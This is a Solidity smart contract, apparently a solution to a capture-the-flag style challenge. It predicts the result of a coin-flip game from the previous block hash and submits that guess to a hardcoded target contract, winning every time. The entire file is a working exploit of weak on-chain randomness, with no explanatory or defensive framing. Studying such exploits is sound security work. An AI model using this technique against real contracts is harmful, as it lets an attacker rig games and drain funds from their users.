// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Coin {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;

  function flip() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    (bool success,) = 0x8848b707E0309C777A55739224F65Ca94aaf545e.call(abi.encodeWithSignature("flip(bool)", side));
    if (!success) {
        revert();
    }
  }
}